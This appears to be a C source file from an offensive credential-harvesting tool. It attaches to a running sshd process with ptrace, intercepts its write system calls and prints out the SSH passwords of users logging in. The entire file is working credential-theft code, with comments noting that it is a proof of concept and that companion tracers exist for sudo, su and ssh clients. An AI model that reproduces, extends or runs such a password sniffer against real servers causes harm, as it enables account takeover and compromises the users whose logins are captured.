#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <string.h>

#define FILE_SSH_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;


/*
 * finds ssh password candidates in memory
 * The write system call that transfers the
 * credential strings (among other strings)
 * begins with a length checksum at index 4 or 8
 * into the string
 *
 * write("\x00\x00\x00\x00\x08password\x00")
 *
 * Search all write system calls for a checksum with a
 * valid length string after and log them
 *
 */
char *find_password_write(char *memory, unsigned long len) {
  char *retval = NULL;
  char *strval = NULL;
  char *memory_copy = NULL;
  unsigned int checksum = 0;
  size_t slen = 0;

  //Checked earlier, but just in case someone else uses this function later
  if (len > MAX_PASSWORD_LEN)
    len = MAX_PASSWORD_LEN;

  memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);

  if (!memory_copy)
    goto failed_find_password;

  // Different branch so it isn't compiled if the compile time
  // configuration option SHORT_SSH_STRINGS isn't set we aren't wasting
  // time. SHORT_SSH_STRINGS is off by default
  if (SHORT_SSH_STRINGS && len <= 8 && len > 4) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }
  }

  if (len > 8) {
    memset(memory_copy, 0, len);
    memcpy(memory_copy, memory, len);

    strval = &memory_copy[4];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[0];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

    strval = &memory_copy[8];
    slen = strlen(strval);

    // Bytes to read checksum in the sshd write syscall
    checksum = ((unsigned int *) memory_copy)[1];
    checksum = ((checksum >> 24) & 0x000000ff)
             | ((checksum >> 8)  & 0x0000ff00)
             | ((checksum << 8)  & 0x00ff0000)
             | ((checksum << 24) & 0xff000000);

    if (slen == checksum) {
      retval = (char *) calloc(sizeof(char) * len + 1, 1);

      if (!retval)
        goto failed_find_password;

      memcpy(retval, strval, slen);
      free(memory_copy);
      return retval;
    }

  }

failed_find_password:
  free(memory_copy);
  return NULL;
}

/* This tracer is mostly a proof of concept.
 * This can easily be done with a command like
 * `strace -p ${sshd_pid} -f 2>&1 | grep write`
 * Although, strace isn't on a lot of servers by
 * default. Other tracers like sudo, su, and ssh
 * client are slightly better usecases for this tool
 */
void intercept_ssh(pid_t traced_process) {
  char *write_string = NULL;
  char *password = NULL;
  int status = 0;
  int syscall = 0;
  long length = 0;
  struct user_regs_struct regs;

  memset(&regs, 0, sizeof(regs));
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status)) {
    goto exit_ssh;
  }

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    // Refresh the process name because sshd changes its process name  from
    // sshd: [accepted] to sshd: username [net]
    refresh_process_name(traced_process);
    syscall = get_syscall(traced_process);

    if (wait_for_syscall(traced_process) != 0)
      break;

    if (syscall == SYSCALL_write) {
      length = get_reg(traced_process, eax);

      assert(errno == 0);

      //OPTIMIZATION NOTE: This check speeds things up, feel free to remove the if here
      //change MAX_PASSWORD_LEN in the config.h file to read larger passwords
      if (length <= 0 || length > MAX_PASSWORD_LEN)
        continue;

      write_string = extract_write_string(traced_process, length);
      password = find_password_write(write_string, length);

      if (password && strnascii(password, length))
        output("%s\n", password);

      free(write_string);
      free(password);
      password = NULL;
      write_string = NULL;
    }
  }

exit_ssh:
  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}
